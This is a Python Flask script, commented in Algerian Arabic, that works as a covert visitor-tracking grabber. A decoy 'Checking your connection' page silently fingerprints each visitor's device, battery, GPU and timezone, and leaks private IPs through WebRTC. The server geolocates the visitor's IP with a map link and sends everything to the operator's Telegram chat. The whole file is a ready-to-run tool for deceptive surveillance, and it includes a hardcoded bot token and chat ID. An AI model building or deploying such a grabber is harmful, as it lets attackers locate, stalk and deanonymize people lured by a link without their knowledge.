import os
import requests
import socket
import threading
import telebot
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

# ═══════════════════════════════════════════
# ⚙️ الإعدادات
# ═══════════════════════════════════════════
# ⚠️ غير هذا التوكن بواحد جديد من @BotFather
TELEGRAM_BOT_TOKEN = "9256373477:AAFnxsNmnisACH3wJyfXp5bMP6tFelVt4VI"
YOUR_CHAT_ID = 8926806806

PORT = int(os.environ.get("PORT", 5000))
app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ═══════════════════════════════════════════
# صفحة HTML (جمع أقصى معلومات ممكنة)
# ═══════════════════════════════════════════
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            color: white; text-align: center; padding: 20px; overflow: hidden;
        }
        .container { animation: fadeIn 1s ease-in-out; }
        h1 { font-size: 56px; font-weight: 800; color: #48dbfb; margin-bottom: 20px; }
        .msg { font-size: 30px; font-weight: 600; color: #feca57; margin-bottom: 25px; }
        .spinner {
            width: 50px; height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to NeXo</h1>
        <div class="msg">Checking your connection...</div>
        <div class="spinner"></div>
    </div>

    <script>
        async function collectEverything() {
            const data = {};

            // ═══════ 1. معلومات الجهاز والنظام ═══════
            data.userAgent = navigator.userAgent;
            data.platform = navigator.platform || "N/A";
            data.vendor = navigator.vendor || "N/A";
            data.product = navigator.product || "N/A";
            data.language = navigator.language || "N/A";
            data.languages = (navigator.languages || []).join(", ");
            data.cookies = navigator.cookieEnabled ? "Yes" : "No";
            data.dnt = navigator.doNotTrack || "N/A";
            data.online = navigator.onLine ? "Yes" : "No";
            
            // تخمين نظام التشغيل
            let os = "Unknown";
            if (/Windows NT 10/.test(data.userAgent)) os = "Windows 10/11";
            else if (/Windows NT 6.3/.test(data.userAgent)) os = "Windows 8.1";
            else if (/Windows NT 6.1/.test(data.userAgent)) os = "Windows 7";
            else if (/Mac OS X/.test(data.userAgent)) os = "macOS";
            else if (/Android/.test(data.userAgent)) os = "Android";
            else if (/iPhone|iPad/.test(data.userAgent)) os = "iOS";
            else if (/Linux/.test(data.userAgent)) os = "Linux";
            data.os = os;

            // نوع الجهاز
            let device = "Desktop PC";
            if (/android/i.test(data.userAgent)) device = "Android Phone";
            if (/iPad|iPhone|iPod/.test(data.userAgent)) device = "iPhone / iPad";
            if (navigator.maxTouchPoints > 1 && /Macintosh/.test(data.userAgent)) device = "MacBook";
            data.deviceType = device;

            // ═══════ 2. العتاد (Hardware) ═══════
            data.cores = navigator.hardwareConcurrency || "N/A";
            data.memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
            data.touchPoints = navigator.maxTouchPoints || 0;

            // ═══════ 3. الشاشة ═══════
            data.screen = screen.width + "x" + screen.height;
            data.availScreen = screen.availWidth + "x" + screen.availHeight;
            data.colorDepth = screen.colorDepth + "-bit";
            data.pixelRatio = window.devicePixelRatio || "N/A";
            data.orientation = screen.orientation ? screen.orientation.type : "N/A";
            data.windowSize = window.innerWidth + "x" + window.innerHeight;

            // ═══════ 4. كرت الشاشة (GPU) ═══════
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    data.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                    data.gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                }
                data.webglVersion = gl.getParameter(gl.VERSION);
                data.webglMaxTexture = gl.getParameter(gl.MAX_TEXTURE_SIZE);
            } catch(e) {}

            // ═══════ 5. الشبكة والراوتر (WebRTC) ═══════
            try {
                const rtcData = await new Promise((resolve) => {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel("");
                    const ips = new Set();
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) { pc.close(); resolve([...ips]); return; }
                        const m = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/i);
                        if (m && !m[1].startsWith("0.")) ips.add(m[1]);
                    };
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    setTimeout(() => { pc.close(); resolve([...ips]); }, 2000);
                });
                if (rtcData.length) data.localIPs = rtcData.join(", ");
            } catch(e) { data.localIPs = "Blocked"; }

            // معلومات الاتصال
            if (navigator.connection) {
                data.connType = navigator.connection.effectiveType || "N/A";
                data.downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "N/A";
                data.rtt = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "N/A";
                data.saveData = navigator.connection.saveData ? "On" : "Off";
            }

            // ═══════ 6. البطارية ═══════
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.batteryLevel = Math.round(b.level * 100) + "%";
                    data.batteryCharging = b.charging ? "Yes" : "No";
                }
            } catch(e) { data.batteryLevel = "Blocked"; }

            // ═══════ 7. التخزين ═══════
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    data.cacheUsed = Math.round(estimate.usage / (1024 * 1024)) + " MB";
                    data.cacheQuota = Math.round(estimate.quota / (1024 * 1024)) + " MB";
                } catch(e) {}
            }

            // ═══════ 8. الوقت والمنطقة الزمنية ═══════
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
            data.localTime = new Date().toLocaleString();
            data.utcOffset = -new Date().getTimezoneOffset() / 60 + " hours";

            // ═══════ 9. كاميرا ومايك (إذا مسموح) ═══════
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    data.mediaDevices = devices.map(d => d.kind).filter((v,i,a)=>a.indexOf(v)===i).join(", ");
                } catch(e) { data.mediaDevices = "Blocked"; }
            }

            // ═══════ 10. معلومات إضافية ═══════
            data.referrer = document.referrer || "Direct";
            data.pageUrl = window.location.href;

            // إرسال
            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {}
        }

        collectEverything();
    </script>
</body>
</html>
"""

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,timezone,isp,org,as,mobile,proxy,hosting,lat,lon,query", timeout=5)
        if r.status_code == 200 and r.json().get('status') == 'success':
            return r.json()
    except: pass
    return {}

def get_hostname(ip):
    try: return socket.gethostbyaddr(ip)[0]
    except: return "Ma3loumch"

# ═══════════════════════════════════════════
# رسالة تلجرام (بالدارجة الجزائرية)
# ═══════════════════════════════════════════
def send_telegram_message(ip, ip_info, extra=None):
    hostname = get_hostname(ip)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # علامات أمنية
    flags = []
    if ip_info.get('mobile'): flags.append("📱 شبكة خلوية")
    if ip_info.get('proxy'): flags.append("🕵️ بروكسي/VPN")
    if ip_info.get('hosting'): flags.append("☁️ سيرفر/استضافة")
    flags_str = " | ".join(flags) if flags else "ماشي مشبوه"

    text = f"""
🎯 **كاين زائر جديد دخل!**
🕐 **الوقت:** `{now}`

🌐 **الـ IP تاعو:** `{ip}`
🖥️ **Hostname:** `{hostname}`
🌍 **البلد والمدينة:** `{ip_info.get('country', '؟')} - {ip_info.get('city', '؟')}`
📍 **المنطقة:** `{ip_info.get('regionName', '؟')}`
📮 **الرمز البريدي:** `{ip_info.get('zip', '؟')}`
🏢 **مزود الإنترنت (ISP):** `{ip_info.get('isp', '؟')}`
📡 **المنظمة:** `{ip_info.get('org', '؟')}`
🔢 **ASN:** `{ip_info.get('as', '؟')}`
⚠️ **علامات:** `{flags_str}`
"""

    # إحداثيات الخريطة
    lat, lon = ip_info.get('lat'), ip_info.get('lon')
    if lat and lon:
        text += f"📌 [شوفو فالخريطة](https://www.google.com/maps?q={lat},{lon})\n"

    if extra:
        text += f"""
━━━━━━━━━━━━━━━━━━━━
📱 **الجهاز:**
`النوع: {extra.get('deviceType', '؟')}`
`النظام: {extra.get('os', '؟')}`
`المنصة: {extra.get('platform', '؟')}`

💻 **الشاشة:**
`الدقة: {extra.get('screen', '؟')}`
`المتاحة: {extra.get('availScreen', '؟')}`
`النافذة: {extra.get('windowSize', '؟')}`
`عمق الألوان: {extra.get('colorDepth', '؟')}`
`كثافة البكسل: {extra.get('pixelRatio', '؟')}`
`الاتجاه: {extra.get('orientation', '؟')}`

⚙️ **العتاد:**
`البروسيسور: {extra.get('cores', '؟')} أنوية`
`الرام: {extra.get('memory', '؟')}`
`نقاط اللمس: {extra.get('touchPoints', '؟')}`
`كرت الشاشة: {extra.get('gpuRenderer', '؟')}`
`مصنع الكرت: {extra.get('gpuVendor', '؟')}`

🔋 **البطارية:**
`المستوى: {extra.get('batteryLevel', '؟')}`
`تشحن: {extra.get('batteryCharging', '؟')}`

📶 **الشبكة:**
`الـ Private IP: {extra.get('localIPs', '؟')}`
`نوع الاتصال: {extra.get('connType', '؟')}`
`سرعة التنزيل: {extra.get('downlink', '؟')}`
`الـ Ping: {extra.get('rtt', '؟')}`
`وضع توفير البيانات: {extra.get('saveData', '؟')}`
`متصل: {extra.get('online', '؟')}`

💾 **التخزين:**
`الكاش المستعمل: {extra.get('cacheUsed', '؟')}`
`الحجم الكلي: {extra.get('cacheQuota', '؟')}`

🕒 **الوقت:**
`المنطقة الزمنية: {extra.get('timezone', '؟')}`
`اللغة: {extra.get('locale', '؟')}`
`الوقت المحلي: {extra.get('localTime', '؟')}`
`فارق UTC: {extra.get('utcOffset', '؟')}`

🔒 **الخصوصية:**
`الكوكيز: {extra.get('cookies', '؟')}`
`DNT: {extra.get('dnt', '؟')}`
`اللغات: {extra.get('languages', '؟')}`
`المصدر: {extra.get('referrer', '؟')}`
`كاميرا/مايك: {extra.get('mediaDevices', '؟')}`

🖱️ **User Agent:**
`{extra.get('userAgent', '؟')[:180]}...`
"""

    text += "\n_ربي يسهل • NeXo_"

    # تلجرام عندو حد 4096 حرف، نقصو إيلا زاد
    if len(text) > 4000:
        text = text[:3990] + "...\n_[طويل بزاف]_"

    try:
        bot.send_message(YOUR_CHAT_ID, text, parse_mode='Markdown', disable_web_page_preview=True)
        print(f"[✓] Message sent for IP: {ip}")
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")

@app.route('/')
def index():
    ip = get_client_ip()
    threading.Thread(target=send_telegram_message, args=(ip, get_ip_info(ip))).start()
    return render_template_string(HTML_PAGE)

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json()
        ip = get_client_ip()
        threading.Thread(target=send_telegram_message, args=(ip, get_ip_info(ip), data)).start()
        return jsonify({"status": "ok"})
    except: return jsonify({"status": "error"}), 500

@app.route('/health')
def health(): return "OK", 200

if __name__ == "__main__":
    try:
        bot.send_message(YOUR_CHAT_ID, "✅ **البوت راهو خدام!**\nأي زائر جديد يجي، راح يوصلك كلش عليه في تلجرام.", parse_mode='Markdown')
        print("[✓] Startup message sent")
    except Exception as e:
        print(f"[WARNING] Startup error: {e}")

    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
